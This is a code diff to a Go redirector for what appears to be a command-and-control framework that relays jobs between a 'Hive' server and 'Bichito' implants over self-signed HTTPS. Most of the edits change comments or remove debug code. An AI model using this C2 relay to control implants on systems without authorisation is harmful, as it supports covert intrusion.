@@ -3,9 +3,9 @@
 //
 //   Network Method: Egress to a https Golang Server redirector, using a self signed certificate.Implant will not check target TLS fingenprint.
 //
-//   Warnings:       wILL work with MITM tls proxies, but server certificate is not signed.              
+//   Warnings:       Will work with MITM tls proxies, but server certificate is not signed.              
 //                   
-//   Fingenprint:    GO-LANG TLS Libraries (target OS network stack?)
+//   Fingenprint:    GO-LANG TLS Libraries for the http Server 
 //
 //   IOC Level:      Medium
 //   
@@ -28,6 +28,10 @@ import (
 
 )
 
+/*
+JSON Structures for Compiling Redirectors Network Module parameters
+Hive will have the same definitions in: ./src/hive/hiveImplants.go
+*/
 type RedSelfSignedhttps struct {
 	Port string   `json:"port"`
 }
@@ -37,8 +41,13 @@ type BiAuth struct {
     Token string  `json:"token"`  
 }
 
-// Transport Level Socket Function
-
+/*
+Description: SelfSignedhttps Module Redirector Handler
+Flow:
+A. Extract from the JSON Encoded string the parameters needed for this module
+B. Start the https servlet. Define Endpoints.
+C. Start the https server
+*/
 func bichitoHandler(){
 
 	//Decode Module Parameters, create listener socket
@@ -96,7 +105,7 @@ func commonMiddleware(next http.Handler) http.Handler {
     })
 }
 
-//Retrieve all the Jobs that need to be sent back to target Bot
+//Retrieve all the Jobs that need to be sent back to target Bichito
 func SendJobs(w http.ResponseWriter, r *http.Request) {
     
     //Auth
@@ -105,17 +114,7 @@ func SendJobs(w http.ResponseWriter, r *http.Request) {
         return
     }    
 
-    //Debug: Send Hive Jobs to Bichito
-    /*
-    requestDump, err2 := httputil.DumpRequest(r, true)
-    if err2 != nil {
-        fmt.Println(err2)
-    }
-    fmt.Println(string(requestDump))
-    */
-
     json.NewEncoder(w).Encode(getBiJobs(bid))
-
     
 }
 
@@ -137,14 +136,6 @@ func ReceiveJob(w http.ResponseWriter, r *http.Request) {
 		return
     }
 
-    //Debug: Get the Jobs from Bichito and send to Hive
-    /*
-    requestDump, err2 := httputil.DumpRequest(r, true)
-    if err2 != nil {
-        fmt.Println(err)
-    }
-    fmt.Println(string(requestDump))
-    */
 
     go processJobs(jobs)
 
